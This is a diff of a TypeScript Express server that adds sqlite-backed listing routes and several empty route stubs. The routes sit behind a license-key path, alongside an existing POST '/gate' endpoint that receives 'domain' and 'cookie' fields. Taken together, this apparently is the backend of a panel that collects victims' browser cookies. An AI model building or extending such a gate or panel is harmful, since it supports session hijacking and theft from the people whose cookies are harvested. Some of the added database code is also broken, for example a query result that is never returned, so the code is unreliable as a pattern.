@@ -3,6 +3,7 @@ import * as express from "express"
 import * as bodyParser from "body-parser";
 import * as cors from "cors";
 import * as fs from "fs";
+import * as sqlite3 from 'sqlite3';
 import {Generator} from "./modules/generator";
 import {Logger} from "./modules/logger";
 import {Loader} from "./modules/loader";
@@ -18,6 +19,7 @@ export class App {
   public expose: any;
   public detectedIp: any;
   public salty: String;
+  public contain: any;
     constructor() {
         this.locker = new Locker();
         this.logger = new Logger();
@@ -309,6 +311,39 @@ export class App {
             res.send(`<h2> Timer Polling Aggiornato </h2>`);
             res.end();
         });
+        app.get('/'+this.conf.licenseKey+'/session/list',(req,res)=>{
+            const db  = new sqlite3.Database('./history.db', sqlite3.OPEN_READWRITE);
+            const sql = "SELECT * FROM session";
+            db.all(sql, [], function(err, rows) {
+              if (err) {
+                console.log(err);
+              }
+              console.log(rows);
+            });
+            //res.send('<h2> address 1: '+rows+'</h2>');
+            res.end();
+        });
+        app.get('/'+this.conf.licenseKey+'/info/list',(req,res)=>{
+          try {
+            const db  = new sqlite3.Database('./history.db', sqlite3.OPEN_READWRITE);
+            const sql = "SELECT * FROM info";
+            const result = db.run(sql, []);
+            console.log(result);
+            res.send(result);
+          } catch (err) {
+              return console.error(err);
+            }
+            res.end();
+        });
+        app.get('/'+this.conf.licenseKey+'/db/clear',(req,res)=>{
+
+        });
+        app.get('/'+this.conf.licenseKey+'/get/address/:addressname',(req,res)=>{
+
+        });
+        app.get('/'+this.conf.licenseKey+'/get/keyword/:keywordname',(req,res)=>{
+
+        });
         app.post('/gate',(req,res)=>{
           if (req.body.domain === null && req.body.cookie === null){
             this.logger.alertMessage(req);
@@ -320,7 +355,7 @@ export class App {
          });
         const web = http.createServer(app);
         web.listen(x,y , () => {
-          console.log('[!] Server Status ON with '+`PID: ${process.pid}`);
+          console.log('[!] Server Status ON with '+`PID: ${process.pid}`+' Given IP Addr:'+this.detectedIp);
         });
     }
 }
